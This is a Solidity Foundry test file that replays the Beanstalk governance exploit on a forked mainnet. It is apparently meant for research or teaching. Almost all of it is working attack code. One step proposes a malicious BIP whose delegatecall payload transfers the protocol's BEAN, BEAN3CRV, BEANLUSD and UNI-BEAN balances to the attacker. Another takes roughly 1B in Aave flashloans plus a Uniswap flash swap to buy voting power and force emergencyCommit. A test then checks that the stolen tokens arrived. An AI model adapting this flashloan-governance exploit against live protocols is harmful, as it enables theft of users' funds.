// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
 
import {IERC20} from "../../interfaces/IERC20.sol";
import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import "./Interfaces.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
 
contract BeanstalkAttack is TokenBalanceTracker {

    IBeanStalk private constant beanstalk = IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IERC20 private constant bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IAaveLendingPool private constant aave = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IUniswapV2Router02 private constant uniswap = IUniswapV2Router02(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IUniswapV2Factory private constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); 
    ICurvePool private constant crvbean = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 private constant crv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    ICurvePool private constant crvpool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    IUniswapV2Factory private constant sushi = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IERC20 private constant lusd = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    address private constant usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    constructor() {
        addTokenToTracker(address(weth));
        addTokenToTracker(usdc);
        addTokenToTracker(address(bean));
        addTokenToTracker(address(lusd));
        addTokenToTracker(address(crv));
        addTokenToTracker(address(crvbean));
        addTokenToTracker(address(0x87898263B6C5BABe34b4ec53F22d98430b91e371));
        
        updateBalanceTracker(address(this));
        updateBalanceTracker(address(beanstalk));
    }

    function propose() external payable {
        // proposing the bip requires a stake
        // this money must be owned when preparing the attack
        bean.approve(address(beanstalk), type(uint256).max);
        
        address[] memory path = new address[](2);
        path[0] = uniswap.WETH();
        path[1] = address(bean);  //we need bean tokens
        uniswap.swapExactETHForTokens{value: 100 ether}(0, path, address(this), block.timestamp + 1);
        
        //depositing into bean
        beanstalk.depositBeans(bean.balanceOf(address(this)));

        //the proposal is just calling the entrypoint function at this contract address
        //this will be performed using a delegate call from the beanstalk silo
        IBeanStalk.FacetCut[] memory cut = new IBeanStalk.FacetCut[](0);
        bytes memory data = abi.encodeWithSelector(BeanstalkAttack.entrypoint.selector);
        beanstalk.propose(cut, address(this), data, 3);
    }
    
    function entrypoint() external {
        //Don't use storage here as this is called though delegateCall
        //Here we have msg.sender as the attacker and this as the victim
        address token = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD; //BEAN 3CRV
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));

        token = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D; //BEANLUSD
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));

        token = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db; //BEAN
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));

        token = 0x87898263B6C5BABe34b4ec53F22d98430b91e371; //UNI-BEAN
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function attack() external {
        logBalancesWithLabel("Initial balance", address(this));
        logBalancesWithLabel("Initial balance", address(beanstalk));
        //Approvals
        //we need to deposit in crv liquidity pool and also approve aave so it can recover the funds
        //after the flashloan
        //approvals could be performed later, but there's no real benefit on it
        address[] memory addresses = new address[](2);
        addresses[0] = address(crvpool);
        addresses[1] = address(aave);

        address[] memory tokens = new address[](3);
        tokens[0] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); //DAI
        tokens[1] = address(0xdAC17F958D2ee523a2206206994597C13D831ec7); //USDT
        tokens[2] = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); //USDC
        
        for (uint i = 0; i < addresses.length; i++) {
            address a = addresses[i];
            //USDT fails when calling approve, so we use a low level call
            bytes memory data = abi.encodeWithSelector(bean.approve.selector, a, type(uint256).max);
            for (uint j = 0; j < tokens.length; j++) {
                address token = tokens[j];
                token.call(data);
            }
        }
        
        //Aave flashloan - 350M DAI / 150M USDT / 500M USDC
        //Values used by the attacker
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000;
        amounts[1] = 150000000;
        amounts[2] = 500000000;

        //decimals could be included above for saving gas, this is probably clearer
        for (uint256 i = 0; i < 3; i++) {
            amounts[i] = amounts[i] * (10**uint256(IERC20(tokens[i]).decimals()));
        }
        //aave flashloans work by calling executeOperation and leaving allowance so it can recoverd the requested tokens + premiums
        aave.flashLoan(address(this), address[](tokens), amounts, new uint256[](3), address(this), new bytes(0), 0);

        uint256 balance = crv.balanceOf(address(this));
        crvpool.remove_liquidity_one_coin(balance, 1, 0);
    }

    //Aave flashloan callback
    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        logBalancesWithLabel("Aave flashloan", address(this));
        //Notice that the 3crv params have an order, which is not the case in uniswap
        uint256[3] memory params3;
        params3[0] = amounts[0];
        params3[1] = amounts[2]; //Inverted
        params3[2] = amounts[1];

        //we add liquidity to 3curve pools so we can later get
        //crvbeans for depositing in beanstalk
        crvpool.add_liquidity(params3, uint256(0));

        //hardcoding this value could save some gas
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(bean), address(weth)));
        require(address(pair) != address(0), "Missing unswap v2 bean pair");

        //data parameter is used for identifying flash swaps vs normal swaps
        bytes memory data = abi.encodePacked(uint256(1));
        pair.swap(0, 10000000 * 10**bean.decimals(), address(this), data);

        //these values are needed by aave to recover the funds
        //calling remove_liquidity_one_coin without calling remove_liquidity_imbalance first
        //will return all the value in only one token
        params3[0] = amounts[0] + premiums[0];
        params3[1] = amounts[2] + premiums[2];
        params3[2] = amounts[1] + premiums[1];
        crvpool.remove_liquidity_imbalance(params3, type(uint256).max);

        logBalancesWithLabel("Flashloan paids, attacker", address(this));
        return true;
    }

    // Uniswap flashloan callback
    function uniswapV2Call(address, uint, uint amount, bytes calldata) external {
        //Example of how to check for uniswap vs sushiswap: we compare the senders against the pair
        //Sushiswap flashloans enters in the else clause, but as we don't need it we just leave the example
        //here.
        IUniswapV2Pair upair = IUniswapV2Pair(factory.getPair(address(bean), address(weth)));
        if (address(upair) == msg.sender) {
            IUniswapV2Pair spair = IUniswapV2Pair(sushi.getPair(address(lusd), address(weth)));
            bytes memory data = abi.encodeWithSelector(spair.swap.selector, 0, 1, address(this), abi.encodePacked(uint256(1)));
            (bool success, bytes memory ret) = address(spair).call(data);
        } else {
            return; //we do nothing with sushi flashloan, only leaving the example
        }

        //Uniswap flashloan is not necessary for this attack.
        //It could be done with the aave flashloan only, but we leave the example here for reference
        //though the money of this flashloan is not used
        //It was probably done to make sure that the attacker would have enough voting power
        crv.approve(address(crvbean), type(uint256).max); //for add_liquidity
        crvbean.approve(address(beanstalk), type(uint256).max); //for deposit
        
        //we are omitting here sushi flashloan for 11M LUSD
        uint256[2] memory params2;
        params2[0] = 0;
        params2[1] = crv.balanceOf(address(this));
        crvbean.add_liquidity(params2, 0);
        beanstalk.deposit(address(crvbean), crvbean.balanceOf(address(this)));
        logBalancesWithLabel("Before commit, attacker", address(this));

        //We made our deposit in bean, we are ready to execute the bip
        beanstalk.emergencyCommit(18);

        logBalancesWithLabel("Attack done, attacker", address(this));
        logBalancesWithLabel("Attack done, victim", address(beanstalk));
        crvbean.remove_liquidity_one_coin(crvbean.balanceOf(address(this)), 1, 0);

        //uniswap has this fixed fee, it must be paid explicitely
        uint256 repay = 1 + amount + (amount * 3) / 997;
        //this contract would be vulnerable here
        //advance bots could take advantage of the next line and steal funds at this point
        //so it would be wise to protect it by checking that msg.sender == pair (the uniswap,
        //contract that returns getPair)
        bean.transfer(msg.sender, repay);

    }
}

contract Exploit_Beanstalk is Test {
   function setUp() public {
        vm.createSelectFork("mainnet", 14595000); //we register the proposal here and wait 1 full day
        vm.deal(address(this), 100 ether);


   }
 
   function test_attack() public {
        BeanstalkAttack att = new BeanstalkAttack();
        att.propose{value: 100 ether}();
        vm.warp(block.timestamp + 1 days); //proposal can be executed now

        att.attack();

        //Stolen tokens should be converted into eth to remove third party intervention
        address token = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; //USDC
        require(IERC20(token).balanceOf(address(att)) > 0);
        
        token = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D; //BEANLUSD
        require(IERC20(token).balanceOf(address(att)) > 0);

        token = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db; //BEAN
        require(IERC20(token).balanceOf(address(att)) > 0);

        token = 0x87898263B6C5BABe34b4ec53F22d98430b91e371; //UNI-BEAN
        require(IERC20(token).balanceOf(address(att)) > 0);
   }
}